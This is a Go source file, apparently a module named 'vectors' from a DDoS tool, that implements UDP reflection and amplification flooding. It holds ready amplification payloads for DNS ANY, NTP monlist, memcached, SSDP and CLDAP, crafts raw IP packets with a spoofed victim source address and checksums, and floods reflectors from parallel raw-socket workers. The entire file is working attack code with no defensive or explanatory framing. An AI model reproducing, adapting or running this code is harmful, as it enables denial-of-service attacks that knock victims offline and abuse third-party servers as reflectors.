package vectors

import (
	"encoding/binary"
	"math/rand"
	"net"
	"sync"
	"sync/atomic"
	"time"

	"golang.org/x/sys/unix"
)

type AmpType int

const (
	AmpDNS AmpType = iota
	AmpNTP
	AmpMemcached
	AmpSSDP
	AmpCLDAP
)

type UDPAmplifier struct {
	typ     AmpType
	srcIP   net.IP
	dstIP   net.IP
	dstPort uint16
	packets atomic.Uint64
}

func NewUDPAmplifier(typ AmpType, spoofSrc, reflector string, reflectorPort uint16) *UDPAmplifier {
	return &UDPAmplifier{
		typ:     typ,
		srcIP:   net.ParseIP(spoofSrc).To4(),
		dstIP:   net.ParseIP(reflector).To4(),
		dstPort: reflectorPort,
	}
}

func (u *UDPAmplifier) payload() []byte {
	switch u.typ {
	case AmpDNS:
		return []byte{
			0x12, 0x34, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00,
			0x03, 'i', 's', 'c', 0x03, 'o', 'r', 'g', 0x00,
			0x00, 0xff, 0x00, 0x01,
		}
	case AmpNTP:
		return []byte{0x17, 0x00, 0x03, 0x2a, 0x00, 0x00, 0x00, 0x00}
	case AmpMemcached:
		return []byte("stats\r\n")
	case AmpSSDP:
		return []byte("M-SEARCH * HTTP/1.1\r\n" +
			"HOST: 239.255.255.250:1900\r\n" +
			"MAN: \"ssdp:discover\"\r\n" +
			"MX: 2\r\nST: ssdp:all\r\n\r\n")
	case AmpCLDAP:
		return []byte{
			0x30, 0x25, 0x02, 0x01, 0x01, 0x63, 0x20, 0x04,
			0x00, 0x0a, 0x01, 0x00, 0x0a, 0x01, 0x00, 0x02,
			0x01, 0x00, 0x02, 0x01, 0x00, 0x01, 0x01, 0x00,
			0x87, 0x0b, 0x6f, 0x62, 0x6a, 0x65, 0x63, 0x74,
			0x43, 0x6c, 0x61, 0x73, 0x73, 0x30, 0x00,
		}
	}
	return nil
}

func (u *UDPAmplifier) buildPacket(payload []byte, rng *rand.Rand) []byte {
	udpLen := 8 + len(payload)
	ipLen := 20 + udpLen

	pkt := make([]byte, ipLen)

	pkt[0] = 0x45
	pkt[1] = 0x00
	binary.BigEndian.PutUint16(pkt[2:4], uint16(ipLen))
	binary.BigEndian.PutUint16(pkt[4:6], uint16(rng.Intn(65535)))
	binary.BigEndian.PutUint16(pkt[6:8], 0x0000)
	pkt[8] = 64
	pkt[9] = 17
	binary.BigEndian.PutUint16(pkt[10:12], 0)
	copy(pkt[12:16], u.srcIP.To4())
	copy(pkt[16:20], u.dstIP.To4())

	var sum uint32
	for i := 0; i < 20; i += 2 {
		sum += uint32(binary.BigEndian.Uint16(pkt[i : i+2]))
	}
	for sum>>16 != 0 {
		sum = (sum & 0xffff) + (sum >> 16)
	}
	binary.BigEndian.PutUint16(pkt[10:12], ^uint16(sum))

	udp := pkt[20:]
	binary.BigEndian.PutUint16(udp[0:2], uint16(rng.Intn(65535)+1024))
	binary.BigEndian.PutUint16(udp[2:4], u.dstPort)
	binary.BigEndian.PutUint16(udp[4:6], uint16(udpLen))
	binary.BigEndian.PutUint16(udp[6:8], 0)
	copy(udp[8:], payload)

	var usum uint32
	src := u.srcIP.To4()
	dst := u.dstIP.To4()
	usum += uint32(binary.BigEndian.Uint16(src[0:2]))
	usum += uint32(binary.BigEndian.Uint16(src[2:4]))
	usum += uint32(binary.BigEndian.Uint16(dst[0:2]))
	usum += uint32(binary.BigEndian.Uint16(dst[2:4]))
	usum += uint32(17)
	usum += uint32(udpLen)
	for i := 0; i < udpLen; i += 2 {
		usum += uint32(binary.BigEndian.Uint16(udp[i : i+2]))
	}
	for usum>>16 != 0 {
		usum = (usum & 0xffff) + (usum >> 16)
	}
	checksum := ^uint16(usum)
	if checksum == 0 {
		checksum = 0xffff
	}
	binary.BigEndian.PutUint16(udp[6:8], checksum)

	return pkt
}

func (u *UDPAmplifier) Run(stop <-chan struct{}, workers int) {
	var wg sync.WaitGroup
	for w := 0; w < workers; w++ {
		wg.Add(1)
		go func(seed int64) {
			defer wg.Done()

			fd, err := unix.Socket(unix.AF_INET, unix.SOCK_RAW, unix.IPPROTO_RAW)
			if err != nil {
				return
			}
			defer unix.Close(fd)
			unix.SetsockoptInt(fd, unix.IPPROTO_IP, unix.IP_HDRINCL, 1)

			dst := &unix.SockaddrInet4{Port: int(u.dstPort)}
			copy(dst.Addr[:], u.dstIP.To4())

			rng := rand.New(rand.NewSource(time.Now().UnixNano() ^ seed))
			payload := u.payload()

			for {
				select {
				case <-stop:
					return
				default:
				}
				pkt := u.buildPacket(payload, rng)
				_ = unix.Sendto(fd, pkt, 0, dst)
				u.packets.Add(1)
			}
		}(int64(w))
	}
	wg.Wait()
}

func (u *UDPAmplifier) Packets() uint64 { return u.packets.Load() }
